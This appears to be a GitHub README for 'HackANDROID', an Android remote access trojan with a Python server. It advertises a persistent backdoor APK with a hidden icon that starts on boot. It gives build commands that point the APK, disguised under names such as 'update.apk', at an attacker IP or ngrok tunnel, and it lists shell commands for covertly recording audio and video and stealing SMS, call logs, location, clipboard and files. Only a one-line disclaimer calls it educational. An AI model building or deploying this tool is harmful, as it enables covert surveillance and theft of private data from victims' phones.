**Disclaimer** : This software is meant for educational purposes only. I don't feel responsible for any malicious use of the app.
# HackANDROID

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
[![GitHub followers](https://img.shields.io/github/followers/Coders-World-Start?label=Follow&style=social)](https://github.com/Coders-World-Start)

HackANDROID is a tool designed to give the control of the android system remotely and retrieve informations from it. HackANDROID is a client/server application developed in Java Android for the client side and the Server is in Python.



## Features of HackANDROID
* Full persistent backdoor
* ~~Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection)~~
* Invisible icon on install
* Light weight apk which runs 24*7 in background
* App starts automatically on boot up 
* Can record audio, video, take picture from both camera
* Browse call logs and SMS logs
* Get current location, sim card details ,ip, mac address of the device


## Prerequisites
HackANDROID requires Python (3.6+) and JAVA 8 .
## Installation
```
git clone https://github.com/Coders-World-Start/HackANDROID.git
pip install -r requirements.txt
```
## Usage (Windows and Linux)

* To get the control panel of the app dial `*#*#1337#*#*` (For now it has only two options `Restart Activity` and `Uninstall`)
> Note: In order to use this feature in some devices you need to enable the option `display pop-up windows running in background` from the settings.

### Available Modes
* `--proceed` - for building the android apk 
* `--ngrok` - for using ngrok tunnel (over the internet)
* `--bash` - getting an interactive shell of the device

### `proceed` mode

```
Usage:
  python androRAT.py --proceed --ngrok -i <IP> -p <Port> -a <name.apk>
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -a, --apk           Name for the apk file (optional by default its set to "update.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

```
Usage:
  python androRAT.py --proceed -i <IP> -p <Port> -a <name.apk>
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
### `bash` mode
```
Usage:
  python HackANDROID.py --bash -i <IP> -p <Port>
  Flags:
    -i, --ip                Last IP address
    -p, --port              Last port number
```
After running the `bash` mode you will get an interpreter of the device  

Commands which can run on the interpreter
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
```
In the sh bash there are some sub commands
```
    get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)
    put [filename]              --> uploads the file to the android device
```

## Examples

* To build the apk using ngrok which will also set the listner:
```python HackANDROID.py --proceed --ngrok -o evil.apk```

* To build the apk using desired ip and port:
```python HackANDROID.py --proceed -i 192.169.x.x -p 8000 -o evil.apk```
* To get IP address :
'''ifconfig''' --> (In Linux Terminal)
'''ipconfig''' --> (In Window CMD)

* To get the interpreter:
```python HackANDROID.py --bash -i 0.0.0.0 -p 8000```


## License
HackANDROID is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.


